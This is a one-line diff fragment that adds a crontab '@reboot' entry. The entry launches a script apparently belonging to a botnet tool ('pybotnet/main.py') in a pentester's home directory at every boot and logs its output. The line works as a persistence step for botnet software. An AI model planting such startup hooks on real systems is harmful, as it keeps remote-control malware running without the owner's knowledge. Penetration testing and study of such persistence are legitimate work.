@@ -1,0 +1,1 @@
+@reboot /usr/bin/python3 /home/ubun/pentester/pybotnet/main.py >> /home/ubun/file.log 2>&1
